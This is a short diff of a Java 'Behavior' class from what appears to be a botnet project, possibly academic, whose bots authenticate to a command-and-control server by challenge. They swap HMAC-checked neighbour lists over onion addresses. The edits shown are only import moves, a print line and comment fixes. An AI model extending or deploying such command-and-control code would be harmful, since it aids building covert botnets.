@@ -10,11 +10,11 @@ import java.util.concurrent.ExecutionException;
 import java.util.concurrent.Future;
 
 import cs.sii.domain.OnionAddress;
+import cs.sii.service.crypto.Auth;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 
-import cs.sii.config.onLoad.Config;
 import cs.sii.domain.Pairs;
 import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
@@ -22,7 +22,7 @@ import cs.sii.model.role.Role;
 import cs.sii.model.user.User;
 import cs.sii.network.request.BotRequest;
 import cs.sii.service.connection.NetworkService;
-import cs.sii.service.connection.P2PMan;
+import cs.sii.service.graph.P2PMan;
 import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.dao.BotServiceImpl;
 import cs.sii.service.dao.RoleServiceImpl;
@@ -77,6 +77,7 @@ public class Behavior {
 	 * 
 	 */
 	public void initializeBot() {
+		System.out.println("INIZIALIZZAZIONE BOT MODE");
 		if (challengeToCommandConquer()) {
 			System.out.println("Bot Autenticazione riuscita");
 		} else
@@ -381,7 +382,7 @@ public class Behavior {
 								if (b != null && b) {
 //									System.out.println("botSize " + botResp.getSize());
 								} else {
-									System.out.println("challenge vicini  hmac null o false" + b);
+									System.out.println("Challenge vicini hmac null o false" + b);
 								}
 							} else {
 								System.out.println("Il vicino ha risposto  null, nessun valore challenge");
@@ -525,8 +526,7 @@ public class Behavior {
 	}
 
 	private void syncNeightoCec(List<OnionAddress> listDeadNegh) {
-		// invico a cec di mia nuova lista vicini ovvero di chi mi ha risposto
-
+		// invio a cec la mia nuova lista vicini ovvero di chi mi ha risposto
 		List<Pairs<OnionAddress, PublicKey>> newNeighbours = new ArrayList<Pairs<OnionAddress, PublicKey>>();
 		List<Pairs<String, String>> response = null;
 		if (!nServ.isCommandandconquerStatus()) {
